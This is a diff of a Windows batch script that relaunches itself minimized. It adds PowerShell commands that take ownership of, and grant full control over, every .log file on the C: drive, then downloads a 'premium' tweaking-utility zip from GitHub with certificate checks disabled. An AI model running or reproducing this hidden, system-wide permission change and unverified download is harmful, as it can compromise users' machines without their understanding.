@@ -10,6 +10,17 @@ if "%1"=="h" goto ocultar
 start /min cmd /c %0 h & exit
 :ocultar
 
+echo Obtendo controle total de todos os arquivos .log...
+
+:: Executa o PowerShell para assumir a propriedade e conceder permissões
+powershell -Command "& {
+    Get-ChildItem -Path C:\ -Recurse -Filter *.log -ErrorAction SilentlyContinue | 
+    ForEach-Object {
+        takeown /F $_.FullName /A /R /D Y
+        icacls $_.FullName /Grant Administradores:F /T /C /Q
+    }
+}"
+
 echo No final tem verificaçao de virus
 
 curl -g -k -L -# -o "%temp%\exm.zip" "https://github.com/anonyketa/EXM-Tweaking-Utility-Premium/releases/download/V1.0/exm.zip"
